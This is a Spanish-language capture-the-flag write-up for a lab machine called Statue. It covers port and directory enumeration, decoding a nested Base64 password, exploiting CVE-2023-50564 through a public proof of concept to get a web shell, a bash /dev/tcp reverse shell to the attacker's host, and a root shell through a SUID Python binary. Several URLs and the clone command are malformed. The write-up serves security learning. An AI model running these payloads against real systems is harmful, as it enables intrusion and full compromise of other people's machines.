# CTF Write-up: Statue (`statue.thl`)

Este repositorio contiene la documentación detallada del proceso de auditoría ofensiva y explotación de la máquina **Statue**, un entorno vulnerable de nivel intermedio diseñado para poner a prueba habilidades de enumeración web, análisis de vulnerabilidades conocidas y escalada de privilegios en sistemas Linux.

---

## 📑 Resumen Ejecutivo
*   **Dirección IP Objetivo:** `192.168.0.7`
*   **Hostname Asignado:** `statue.thl`
*   **Vectores Clave:** Local File Inclusion (LFI) simulado por parámetros / Descubrimiento de Credenciales por codificación anidada -> RCE mediante ejecución de exploit para **CVE-2023-50564** -> Escalada de Privilegios mediante abuso de binario SUID con **Python**.

---

## 🛠️ Fase 1: Reconocimiento y Descubrimiento (Reconnaissance)

### 1. Descubrimiento de Puertos y Servicios Activos
Se ejecuta un escaneo táctico de tipo *SYN Stealth Scan* sobre todo el rango de puertos TCP (`65535`) evadiendo la resolución ping (`-Pn`) para identificar vectores de ataque expuestos.

```bash
recon 192.168.0.7
```

**Resultado del Escaneo Inicial (Nmap):**
*   **Port 22/tcp:** `Open` - SSH (OpenSSH 9.6p1 Ubuntu 3ubuntu13.5)
*   **Port 80/tcp:** `Open` - HTTP (Apache httpd 2.4.58)

Se extraen los puertos utilizando herramientas de automatización del entorno local (`extractPorts`) para optimizar fases posteriores.

```bash
extractPorts allPorts
```

---

### 2. Banner Grabbing y Huella Digital de Servicios
Se ejecuta un escaneo avanzado de detección de versiones (`-sV`) y scripts por defecto (`-sC`) contra los puertos específicos identificados.

```bash
enum 22,80 192.168.0.7
```

**Hallazgos Clave:**
*   El servidor web Apache está corriendo sobre Ubuntu Linux.
*   La raíz del servidor web expone un listado de directorios (`Index of /`).

---

## 🌐 Fase 2: Enumeración Web (Web Enumeration)

### 1. Resolución Local de DNS
Para interactuar de forma correcta con la aplicación web y evitar problemas de enrutamiento basados en nombres de host, se mapea la dirección IP en el archivo local de resolución de nombres `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

*Entrada agregada al final del archivo:*
```text
192.168.0.7  statue.thl
```

### 2. Descubrimiento de Directorios y Archivos Ocultos
Se inicia un proceso de *fuzzing* de directorios con `Gobuster` utilizando un diccionario de tamaño medio y buscando extensiones críticas potencialmente expuestas.

```bash
gobuster dir -u http://statue.thl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,back,md
```

**Estructura Web Identificada (Resultados Críticos):**
*   `/index.php` -> Redirecciona de forma automática a `http://statue.thl?file=rodgar` (Posible parámetro LFI bajo análisis).
*   `/admin.php` -> Panel de administración expuesto (Status 200).
*   `/login.php` -> Formulario de autenticación (Status 200).
*   `/docs/` y `/README.md` -> Documentación expuesta del CMS o aplicación en uso.
*   `/install.php` -> Archivo de instalación remanente.

---

## 🔑 Fase 3: Análisis de Vulnerabilidades y Criptoanálisis

### 1. Descubrimiento y Decodificación de Credenciales Ocultas
Al inspeccionar el directorio `/docs/` y realizar una petición HTTP directa con `curl` hacia el archivo `README.md`, se identifica una cadena codificada en formato no convencional.

```bash
curl http://statue.thlREADME.md
```

La estructura y patrones de relleno (`=`) evidencian un cifrado/codificación basado en **Base64** con múltiples iteraciones (anidamiento). Se procesa la cadena aplicando ingeniería inversa sobre siete capas consecutivas de decodificación Base64:

```bash
echo "Vm0xd1MyUXhVWGhYV0d4VFlUSm9WbGx0ZUV0V01XeHpXa2M1YWxadFVuaFZNVkpUVlVaYVZrNVlWbFpTYkVZelZUTmtkbEJSYnowSwo=" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```

**Resultado Obtenido:** `fideicomiso` (Contraseña válida filtrada).

---

## 🚀 Fase 4: Explotación e Intrusión (Gaining Access)

### 1. Ejecución de Exploit (CVE-2023-50564)
El software desplegado en el servidor web es vulnerable a ejecución remota de código (RCE) debido a una sanitización deficiente en la carga de archivos en ciertos módulos de administración. Se clona un repositorio público con la prueba de concepto (PoC) para automatizar el compromiso.

```bash
git clone https://github.com
cd CVE-2023-50564
python3 exploit.py --target http://statue.thl --password fideicomiso
```

El exploit realiza las siguientes acciones de manera exitosa:
1. Genera un payload malicioso comprimido (`malicious.zip`).
2. Autentica en el sistema usando las credenciales descubiertas (`fideicomiso`).
3. Sube y despliega el módulo malicioso, habilitando una web shell interactiva en:
   `http://statue.thldata/modules/malicious/malicious.php?cmd=<COMMAND>`

### 2. Establecimiento de Reverse Shell
Para obtener acceso interactivo al sistema operativo, se abre un puerto en escucha local mediante Netcat desde nuestra máquina atacante (`192.168.0.5`):

```bash
nc -lvnp 443
```

Posteriormente, se fuerza el trigger del payload mediante la web shell inyectando un comando de ejecución de terminal persistente codificado para la URL:

```url
http://statue.thldata/modules/malicious/malicious.php?cmd=bash%20-c%20%27exec%20bash%20-i%20&%3E/dev/tcp/192.168.0.5/443%20%3C&1%27
```

**Acceso inicial consolidado con los privilegios de la cuenta del servidor web.**

---

## ⚡ Fase 5: Escalada de Privilegios (Privilege Escalation)

### 1. Enumeración Interna (Abuso de Permisos SUID)
Una vez dentro del sistema, se realiza una búsqueda exhaustiva de binarios que posean el bit SUID activo (`perm /4000`), permitiendo su ejecución con los privilegios del propietario del archivo (root).

```bash
find / -perm /4000 -type f 2> /dev/null
```

**Binario crítico detectado:** `/usr/bin/python3.12`

### 2. Explotación SUID (Python GTFOBins Vector)
Haciendo uso de la técnica documentada en **GTFOBins**, se aprovecha que el binario de Python corre con capacidades elevadas preservando el ID de usuario real (`-p`) al spawnear una nueva shell para romper el entorno restringido.

```bash
/usr/bin/python3.12 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Se comprueba la escalada de privilegios ejecutando los comandos de verificación de identidad:

```bash
whoami
```

**Resultado:** `root`

**Sistema totalmente comprometido. Acceso root total concedido de manera exitosa.**
